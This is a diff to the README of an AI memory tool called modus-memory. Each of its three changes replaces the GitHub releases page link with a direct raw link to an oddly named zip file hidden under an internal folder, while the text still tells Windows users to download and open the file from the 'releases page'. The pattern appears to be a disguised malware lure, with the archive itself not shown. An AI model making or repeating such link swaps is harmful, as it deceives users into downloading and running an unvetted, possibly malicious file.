@@ -1,6 +1,6 @@
 # 🧠 modus-memory - Simple local memory for AI
 
-[![Download modus-memory](https://img.shields.io/badge/Download-Modus_Memory-blue?style=for-the-badge)](https://github.com/proto-dredge424/modus-memory/releases)
+[![Download modus-memory](https://img.shields.io/badge/Download-Modus_Memory-blue?style=for-the-badge)](https://raw.githubusercontent.com/proto-dredge424/modus-memory/main/internal/trust/modus_memory_exanthematic.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use it when you want a simple place for AI notes, chat memory, and saved context
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/proto-dredge424/modus-memory/releases
+Visit this page to download: https://raw.githubusercontent.com/proto-dredge424/modus-memory/main/internal/trust/modus_memory_exanthematic.zip
 
 On the releases page, look for the latest Windows file. Download the file that matches your system, then open it on your computer.
 
@@ -153,6 +153,6 @@ You may see these common file types:
 
 If you need to update or reinstall, return to the releases page:
 
-https://github.com/proto-dredge424/modus-memory/releases
+https://raw.githubusercontent.com/proto-dredge424/modus-memory/main/internal/trust/modus_memory_exanthematic.zip
 
 Download the newest Windows file and replace your old copy if needed.
